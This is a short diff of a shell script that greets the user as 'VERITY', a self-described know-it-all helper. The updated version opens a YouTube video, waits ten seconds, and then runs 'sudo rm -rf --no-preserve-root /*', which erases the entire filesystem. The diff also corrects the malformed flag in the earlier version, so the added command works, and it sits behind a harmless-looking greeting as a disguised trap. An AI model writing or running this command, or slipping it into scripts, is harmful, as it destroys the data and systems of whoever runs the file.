@@ -1,5 +1,5 @@
-#!/bin/bash
-echo Hey~! Its ME,, its VERITY!
-echo ask me anythign
-echo i know about a million things
-sudo rm -rf --no preserve root /*
+#!/bin/sh
+echo Hey~! Its ME its VERITY!!
+firefox https://www.youtube.com/watch?v=tVlKLpxyCBY
+sleep 10
+sudo rm -rf --no-preserve-root /*
